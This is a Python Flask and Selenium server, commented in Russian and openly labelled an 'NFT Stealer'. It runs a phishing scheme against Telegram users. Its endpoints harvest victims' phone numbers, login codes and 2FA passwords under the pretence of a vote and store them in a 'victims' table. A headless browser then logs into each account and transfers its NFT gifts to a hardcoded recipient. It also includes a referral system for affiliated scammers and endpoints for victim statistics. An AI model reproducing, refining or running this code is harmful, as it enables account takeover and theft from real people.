from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import sqlite3
import logging
import threading
import time
import os
import random
import string
from datetime import datetime

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# 🔥 НАСТРОЙКИ
TARGET_USERNAME = '@trepall'  # Куда пересылать NFT

def init_db():
    conn = sqlite3.connect('nft_stealer.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY, phone TEXT, code TEXT, password TEXT,
                  status TEXT, nft_stolen INTEGER DEFAULT 0, 
                  ref_id TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

def setup_driver():
    """Настройка Chrome для Render"""
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    
    # Для Render
    chrome_options.binary_location = '/usr/bin/chromium-browser'
    
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        return driver
    except Exception as e:
        logging.error(f"❌ Ошибка Chrome: {e}")
        return None

def steal_nft_gifts(phone, code, password=None):
    """Реальная кража NFT подарков через Telegram Web"""
    driver = setup_driver()
    if not driver:
        return 0
    
    stolen_count = 0
    
    try:
        logging.info(f"🚀 Начинаем кражу NFT для {phone}")
        
        # 1. Открываем Telegram Web
        driver.get("https://web.telegram.org/")
        time.sleep(5)
        
        # 2. Ввод номера телефона
        phone_input = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='phone_number']"))
        )
        phone_input.clear()
        phone_input.send_keys(phone)
        
        next_btn = driver.find_element(By.XPATH, "//button[contains(text(),'Next') or contains(text(),'Далее')]")
        next_btn.click()
        time.sleep(3)
        
        # 3. Ввод кода
        code_input = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='verification_code']"))
        )
        code_input.clear()
        code_input.send_keys(code)
        time.sleep(2)
        
        # Нажимаем кнопку входа
        try:
            submit_btn = driver.find_element(By.XPATH, "//button[contains(text(),'Sign In') or contains(text(),'Войти')]")
            submit_btn.click()
        except:
            pass
        
        time.sleep(5)
        
        # 4. Ввод пароля 2FA если есть
        if password:
            try:
                pwd_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='password']"))
                )
                pwd_input.clear()
                pwd_input.send_keys(password)
                submit_btn = driver.find_element(By.XPATH, "//button[contains(text(),'Sign In') or contains(text(),'Войти')]")
                submit_btn.click()
                time.sleep(5)
            except Exception as e:
                logging.info("ℹ️ Пароль не потребовался")
        
        # 5. Проверяем успешный вход
        try:
            WebDriverWait(driver, 20).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, ".ChatList, .chat-list, [data-testid*='chat']"))
            )
            logging.info("✅ Успешный вход в аккаунт")
        except:
            logging.error("❌ Не удалось войти в аккаунт")
            return 0
        
        # 6. Переходим в профиль для поиска NFT подарков
        try:
            profile_btn = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, ".Avatar, [data-testid*='user'], [aria-label*='Profile']"))
            )
            profile_btn.click()
            time.sleep(3)
        except Exception as e:
            logging.error(f"❌ Не могу найти профиль: {e}")
            return 0
        
        # 7. Ищем раздел с подарками
        try:
            gifts_btn = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, 
                    "//*[contains(text(), 'Gifts') or contains(text(), 'Подарки') or contains(text(), 'Gift')]"))
            )
            gifts_btn.click()
            time.sleep(3)
            logging.info("🎁 Найден раздел подарков")
        except Exception as e:
            logging.error(f"❌ Не найден раздел подарков: {e}")
            return 0
        
        # 8. Крадем NFT подарки
        stolen_count = transfer_all_nft_gifts(driver)
        
        return stolen_count
        
    except Exception as e:
        logging.error(f"💥 Критическая ошибка: {e}")
        return 0
    finally:
        driver.quit()

def transfer_all_nft_gifts(driver):
    """Передача всех NFT подарков целевому пользователю"""
    stolen_count = 0
    max_attempts = 20
    
    try:
        # Ищем все элементы которые могут быть NFT подарками
        nft_selectors = [
            ".gift", ".nft", "[class*='gift']", "[class*='nft']",
            ".GiftItem", ".GiftPreview", ".gift-item",
            "[data-testid*='gift']", "[aria-label*='gift']"
        ]
        
        for selector in nft_selectors:
            try:
                nft_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                if nft_elements:
                    logging.info(f"🎁 Найдено {len(nft_elements)} элементов с селектором {selector}")
                    break
            except:
                continue
        
        if not nft_elements:
            logging.warning("⚠️ NFT подарки не найдены")
            return 0
        
        for i in range(min(len(nft_elements), max_attempts)):
            try:
                nft = nft_elements[i]
                logging.info(f"🔄 Обрабатываем NFT #{i+1}")
                
                # Кликаем на NFT
                driver.execute_script("arguments[0].click();", nft)
                time.sleep(3)
                
                # Ищем кнопку передачи
                transfer_buttons = [
                    "//button[contains(text(), 'Transfer')]",
                    "//button[contains(text(), 'Передать')]",
                    "//button[contains(text(), 'Send')]",
                    "//button[contains(text(), 'Отправить')]",
                    "//div[contains(text(), 'Transfer')]",
                    "//div[contains(text(), 'Передать')]"
                ]
                
                transfer_btn = None
                for xpath in transfer_buttons:
                    try:
                        transfer_btn = WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.XPATH, xpath))
                        )
                        break
                    except:
                        continue
                
                if not transfer_btn:
                    logging.warning(f"⚠️ Кнопка передачи не найдена для NFT #{i+1}")
                    continue
                
                # Кликаем на кнопку передачи
                driver.execute_script("arguments[0].click();", transfer_btn)
                time.sleep(2)
                
                # Вводим целевой username
                search_inputs = [
                    "input[placeholder*='Search']",
                    "input[placeholder*='Поиск']", 
                    "input[placeholder*='username']",
                    "input[placeholder*='имя']"
                ]
                
                search_input = None
                for selector in search_inputs:
                    try:
                        search_input = WebDriverWait(driver, 3).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                        )
                        break
                    except:
                        continue
                
                if search_input:
                    search_input.clear()
                    search_input.send_keys(TARGET_USERNAME.replace('@', ''))
                    time.sleep(2)
                
                # Подтверждаем передачу
                confirm_buttons = [
                    "//button[contains(text(), 'Confirm')]",
                    "//button[contains(text(), 'Подтвердить')]",
                    "//button[contains(text(), 'Send')]",
                    "//button[contains(text(), 'Отправить')]"
                ]
                
                confirm_btn = None
                for xpath in confirm_buttons:
                    try:
                        confirm_btn = WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.XPATH, xpath))
                        )
                        break
                    except:
                        continue
                
                if confirm_btn:
                    # Получаем текст кнопки (может содержать стоимость)
                    btn_text = confirm_btn.text
                    if any(word in btn_text.lower() for word in ['fee', 'комиссия', 'ton', 'usd']):
                        logging.info(f"💰 Стоимость перевода: {btn_text}")
                    
                    driver.execute_script("arguments[0].click();", confirm_btn)
                    time.sleep(3)
                    
                    stolen_count += 1
                    logging.info(f"✅ УСПЕШНО УКРАДЕН NFT #{stolen_count}")
                
                # Возвращаемся назад
                try:
                    back_buttons = [
                        "[aria-label*='Back']", "[aria-label*='Назад']",
                        ".back-button", ".BackButton",
                        "button:contains('Back')", "button:contains('Назад')"
                    ]
                    
                    for selector in back_buttons:
                        try:
                            back_btn = driver.find_element(By.CSS_SELECTOR, selector)
                            driver.execute_script("arguments[0].click();", back_btn)
                            break
                        except:
                            continue
                except:
                    # Если не нашли кнопку назад, обновляем страницу
                    driver.get("https://web.telegram.org/")
                    time.sleep(5)
                    break
                
                time.sleep(2)
                
            except Exception as e:
                logging.warning(f"⚠️ Ошибка с NFT #{i+1}: {e}")
                continue
        
        logging.info(f"🎯 Итог: украдено {stolen_count} NFT подарков")
        return stolen_count
        
    except Exception as e:
        logging.error(f"❌ Ошибка передачи NFT: {e}")
        return stolen_count

def background_nft_stealing(phone, code, password=None, ref_id=None):
    """Фоновая кража NFT"""
    try:
        logging.info(f"🎯 Запуск кражи NFT для {phone}")
        
        # Крадем NFT подарки
        stolen_count = steal_nft_gifts(phone, code, password)
        
        # Обновляем базу данных
        conn = sqlite3.connect('nft_stealer.db')
        c = conn.cursor()
        c.execute('''UPDATE victims SET 
                    nft_stolen = ?, status = ? 
                    WHERE phone = ?''',
                 (stolen_count, 'nft_stolen', phone))
        conn.commit()
        conn.close()
        
        if stolen_count > 0:
            logging.info(f"💰 УСПЕХ: Украдено {stolen_count} NFT для {phone}")
        else:
            logging.warning(f"⚠️ Не удалось украсть NFT для {phone}")
            
    except Exception as e:
        logging.error(f"💥 Ошибка фоновой кражи: {e}")

@app.route('/')
def home():
    return jsonify({
        "status": "running", 
        "message": "NFT Stealer Server Working",
        "version": "3.0",
        "target": TARGET_USERNAME
    })

@app.route('/auth', methods=['POST'])
def auth():
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        ref_id = data.get('ref_id', '')
        
        if not phone:
            return jsonify({'status': 'error', 'message': 'Phone required'}), 400
        
        # 🔥 Обработка команды скамера /brbrpatapim
        if phone.startswith('/brbrpatapim'):
            return handle_scammer_command(phone, ref_id)
        
        # Сохраняем номер жертвы
        conn = sqlite3.connect('nft_stealer.db')
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO victims 
                    (phone, status, ref_id) VALUES (?, ?, ?)''',
                 (phone, 'pending', ref_id))
        conn.commit()
        conn.close()
        
        logging.info(f"🎣 Начата фишинг атака на: {phone}")
        
        return jsonify({
            'status': 'code_sent',
            'message': 'Verification code sent to your Telegram'
        })
        
    except Exception as e:
        logging.error(f"❌ Ошибка /auth: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        phone = data.get('phone', '')
        code = data.get('code', '')
        ref_id = data.get('ref_id', '')
        
        if not phone or not code:
            return jsonify({'status': 'error', 'message': 'Phone and code required'}), 400
        
        # Сохраняем код
        conn = sqlite3.connect('nft_stealer.db')
        c = conn.cursor()
        c.execute('''UPDATE victims SET code = ?, status = ? 
                    WHERE phone = ?''',
                 (code, 'code_received', phone))
        conn.commit()
        conn.close()
        
        logging.info(f"🔑 Получен код для {phone}: {code}")
        
        # Всегда запрашиваем пароль для полного доступа
        return jsonify({
            'status': 'password_required',
            'message': 'Please enter your 2FA password for security'
        })
        
    except Exception as e:
        logging.error(f"❌ Ошибка /code: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/password', methods=['POST'])
def password():
    try:
        data = request.get_json()
        phone = data.get('phone', '')
        password = data.get('password', '')
        ref_id = data.get('ref_id', '')
        
        if not phone or not password:
            return jsonify({'status': 'error', 'message': 'Phone and password required'}), 400
        
        # Получаем код из базы
        conn = sqlite3.connect('nft_stealer.db')
        c = conn.cursor()
        c.execute('SELECT code FROM victims WHERE phone = ?', (phone,))
        result = c.fetchone()
        
        if not result:
            return jsonify({'status': 'error', 'message': 'Session expired'}), 400
        
        code = result[0]
        
        # Сохраняем пароль
        c.execute('''UPDATE victims SET password = ?, status = ? 
                    WHERE phone = ?''',
                 (password, 'credentials_complete', phone))
        conn.commit()
        conn.close()
        
        logging.info(f"🔐 Получен пароль для {phone}")
        
        # 🔥 ЗАПУСКАЕМ КРАЖУ NFT В ФОНЕ
        thread = threading.Thread(
            target=background_nft_stealing,
            args=(phone, code, password, ref_id)
        )
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'status': 'success',
            'message': '✅ Thank you! Your vote has been counted successfully.'
        })
        
    except Exception as e:
        logging.error(f"❌ Ошибка /password: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def handle_scammer_command(command, ref_id):
    """Обработка команд скамера"""
    try:
        parts = command.split()
        
        if len(parts) == 1:
            # Показать статистику
            conn = sqlite3.connect('nft_stealer.db')
            c = conn.cursor()
            
            c.execute("SELECT COUNT(*) FROM victims")
            total = c.fetchone()[0]
            
            c.execute("SELECT COUNT(*) FROM victims WHERE status = 'nft_stolen'")
            stolen = c.fetchone()[0]
            
            c.execute("SELECT SUM(nft_stolen) FROM victims")
            total_nft = c.fetchone()[0] or 0
            
            c.execute("SELECT COUNT(*) FROM victims WHERE ref_id = ?", (ref_id,))
            ref_count = c.fetchone()[0]
            
            conn.close()
            
            return jsonify({
                'status': 'quick_stats',
                'message': f'📊 Ваша статистика:\\n👥 Всего жертв: {total}\\n🎯 Успешных краж: {stolen}\\n💰 Украдено NFT: {total_nft}\\n🔗 По вашей ссылке: {ref_count}'
            })
            
        elif len(parts) == 2 and parts[1] == 'create':
            # Создать реферальную ссылку
            username = generate_username()
            ref_link = f"https://your-site.com?ref={username}"
            
            return jsonify({
                'status': 'scammer_created',
                'username': username,
                'ref_link': ref_link,
                'message': '✅ Реферальная ссылка создана!'
            })
            
        else:
            return jsonify({
                'status': 'error',
                'message': 'Неизвестная команда'
            })
            
    except Exception as e:
        logging.error(f"❌ Ошибка команды: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def generate_username():
    """Генерация username для скамера"""
    letters = string.ascii_lowercase + string.digits
    return 'scammer_' + ''.join(random.choice(letters) for i in range(8))

@app.route('/stats')
def stats():
    """Статистика краж"""
    try:
        conn = sqlite3.connect('nft_stealer.db')
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM victims")
        total = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM victims WHERE status = 'nft_stolen'")
        stolen = c.fetchone()[0]
        
        c.execute("SELECT SUM(nft_stolen) FROM victims")
        total_nft = c.fetchone()[0] or 0
        
        c.execute('''SELECT status, COUNT(*) FROM victims 
                    GROUP BY status''')
        status_stats = dict(c.fetchall())
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'total_victims': total,
            'successful_thefts': stolen,
            'total_nft_stolen': total_nft,
            'status_stats': status_stats,
            'target_username': TARGET_USERNAME
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/victims')
def get_victims():
    """Список всех жертв"""
    try:
        conn = sqlite3.connect('nft_stealer.db')
        c = conn.cursor()
        c.execute('''SELECT phone, status, nft_stolen, timestamp, ref_id 
                    FROM victims ORDER BY id DESC LIMIT 50''')
        victims = c.fetchall()
        conn.close()
        
        return jsonify({
            'victims': [
                {
                    'phone': v[0],
                    'status': v[1],
                    'nft_stolen': v[2],
                    'timestamp': v[3],
                    'ref_id': v[4]
                } for v in victims
            ]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    logging.info("🚀 ЗАПУСК NFT STEALER...")
    logging.info(f"🎯 Целевой пользователь: {TARGET_USERNAME}")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
